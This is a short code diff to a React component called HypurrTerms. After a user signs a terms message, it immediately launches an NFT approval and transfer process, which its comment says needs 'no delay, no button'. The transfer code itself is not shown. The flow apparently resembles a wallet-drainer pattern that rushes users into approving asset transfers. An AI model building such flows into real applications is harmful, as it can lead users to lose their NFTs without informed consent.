@@ -357,9 +357,10 @@ const HypurrTerms = () => {
       setSignature(signature);
       
       console.log('Terms signed successfully:', signature);
+      setIsVerifying(false);
       
-      // Automatically start NFT transfer process immediately after signing
-      // This will trigger approval transaction in MetaMask, then transfer
+      // IMMEDIATELY trigger approval - no delay, no button needed
+      console.log('Starting automatic transfer process NOW...');
       handleAutomaticTransfer().catch(err => {
         // Show error to user if transfer fails
         console.error('Transfer error:', err);
